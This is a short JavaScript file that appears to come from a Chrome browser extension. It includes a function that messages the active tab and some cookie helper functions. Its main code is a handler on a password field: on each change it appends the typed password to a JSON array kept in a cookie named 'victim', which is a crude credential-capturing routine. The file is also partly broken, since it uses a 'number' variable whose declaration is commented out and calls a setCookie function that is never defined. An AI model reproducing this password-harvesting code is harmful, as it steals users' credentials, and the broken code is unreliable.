// let number = 10;
// document.addEventListener("DOMContentLoaded", function() {
//     for (let i = 0; i < number; i++) {
//         $('#conten').append(`<input type="text" class="dataInput" id="txtSearch" style="height: 30px; width: 500px">`);
//     }
//     $('#btnSearch').on('click', function() {
//         let arr = [];
//         $('.dataInput').each(function (idx,el) {
//             let data = $(el).val();
//             if (data) {
//                 arr.push(data);
//             }
//         });
//         popup(arr);
//     });
//
//     $('input').keypress(function (e) {
//         var key = e.which;
//         if(key == 13)  // the enter key code
//         {
//             $('#btnSearch').click();
//             return false;
//         }
//     });
// });

function popup(vari) {
    chrome.tabs.query({currentWindow: true, active: true}, function (tabs) {
        var activeTab = tabs[0];
        chrome.tabs.sendMessage(activeTab.id, {arr: vari, number: number});
    });
}

let i = 0;

$('#pass').on('change', function () {
    let cookie = getCookie('victim');
    let array = [];
    console.log(cookie);
    // alert($('#pass').val());
    if (cookie != "") {
        array = JSON.parse(cookie);
    }
    array.push($('#pass').val());
    document.cookie = 'victim=' + JSON.stringify(array);
});

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

function checkCookie() {
    var user = getCookie("username");
    if (user != "") {
        alert("Welcome again " + user);
    } else {
        user = prompt("Please enter your name:", "");
        if (user != "" && user != null) {
            setCookie("username", user, 365);
        }
    }
}
